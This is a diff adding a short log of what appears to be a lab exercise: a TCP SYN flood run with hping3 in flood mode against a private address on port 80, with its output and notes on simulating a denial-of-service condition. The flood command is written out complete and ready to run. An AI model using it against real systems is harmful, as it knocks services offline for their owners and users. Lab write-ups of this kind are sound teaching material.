@@ -1,0 +1,20 @@
+Command Executed:
+sudo hping3 -S --flood -p 80 172.20.4.197
+
+Description:
+TCP SYN Flood attack simulation targeting victim machine.
+
+Output:
+HPING 172.20.4.197 (eth0 172.20.4.197): S set, 40 headers + 0 data bytes
+hping in flood mode, no replies will be shown
+
+Attack Mode:
+Flood mode enabled
+Protocol: TCP
+Flag: SYN
+Destination Port: 80
+Target IP: 172.20.4.197
+
+Observation:
+Continuous SYN packets transmitted without waiting for response.
+High volume traffic generated to simulate DoS condition.
